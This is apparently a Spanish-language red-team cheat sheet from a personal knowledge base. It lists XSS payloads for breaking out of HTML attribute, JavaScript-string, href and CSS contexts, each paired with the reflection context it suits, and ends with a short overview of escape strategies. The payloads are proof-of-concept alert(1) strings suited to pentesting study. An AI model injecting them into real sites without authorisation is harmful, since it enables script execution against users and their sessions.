---
aliases: null
tags:
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
tertiary categories:
  - '[[Web Explotación]]'
kind: SubCheatSheet
linked:
  - '[[Cross-Site Scripting (XSS)]]'
---
# XSS - Escape de Contexto en Atributos

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `"><svg onload=alert(1)>` | Cierra `"` + tag, abre svg con XSS | Reflejo en `<input value="INYECCIÓN">`. `<`/`>` permitidos. |
| `'><svg onload=alert(1)>` | Misma idea, comillas simples | Reflejo en `value='INYECCIÓN'`. |
| `" autofocus onfocus="alert(1)` | Sale del atributo, agrega event handler — NO cierra tag | Cuando `<`/`>` filtrados pero `"` permitida. |
| `" type="image" src="x" onerror="alert(1)` | Override `type` para habilitar `onerror` en input hidden | Reflejo en `<input type="hidden" value="INYECCIÓN">`. |
| `" style="position:fixed;top:0;left:0;width:100%;height:100%" onclick="alert(1)` | Inyecta style + onclick para full-page clickjack | Vector creativo cuando solo permite atributos. |
| `x onerror=alert(1)//` | Espacio separa, `//` comenta resto de attrs | Reflejo en `<img src=INYECCIÓN>` (sin comillas). |
| `');alert(1);//` | Cierra string + ejecuta + comenta | Reflejo dentro de `<button onclick="func('INYECCIÓN')">`. |
| `";alert(1);//` | Variante con doble comilla | Reflejo en handler JS con `"`. |
| `\";alert(1);//` | Escape de backslash + comilla | Reflejo en JS que escapa quotes pero no backslash. |
^xss-atributos

### Por contexto de reflejo

| **Reflejo en** | **Payload típico** | **Notas** |
|:---:|:---:|:---:|
| `<input value="HERE">` | `"><svg onload=alert(1)>` | Más simple — cerrar attr + tag. |
| `<input value='HERE'>` | `'><svg onload=alert(1)>` | Quotes simples. |
| `<input value=HERE>` (sin comillas) | `x onerror=alert(1)` | Espacio separa. |
| `<a href="HERE">` | `javascript:alert(1)` | Pseudo-protocolo si controlás todo. |
| `<a href="/path/HERE">` | `"><svg onload=alert(1)>` | Path prefix — debe escapar. |
| `<script>var x="HERE";</script>` | `";alert(1);//` | Romper string JS. |
| `<script>var x='HERE';</script>` | `';alert(1);//` | Comillas simples. |
| `<button onclick="f('HERE')">` | `');alert(1);//` | Cerrar paréntesis + comillas. |
| `<style>.x{HERE}</style>` | `}body{background:url(javascript:alert(1))}` | CSS context — limitado, mejor pivotar. |
^xss-atributos-contextos

___

## Overview

Cuando el input se refleja **dentro** de un atributo HTML, no podés inyectar `<script>` directamente — el browser lo trata como texto del atributo. Hay que escapar primero.

**Tres estrategias:**

1. **Ruptura total** — cerrar quote + tag con `"><payload>`. Requiere `<`/`>` no filtrados.
2. **Ruptura parcial** — cerrar quote + agregar event handler sin cerrar tag: `" onmouseover="alert(1)`. Útil con `<`/`>` filtrados.
3. **HTML mal formado** — atributos sin quotes permiten escape con espacio simple: `x onerror=alert(1)`.

**Cuando quotes están filtradas (HTML entities/escape):**
- Si reflejo en `<a href>` → pivotar a `javascript:` ([[XSS - Pseudo-protocolos]]).
- Si reflejo en `<input>` → game over en ese contexto, buscar otro punto de inyección.

***
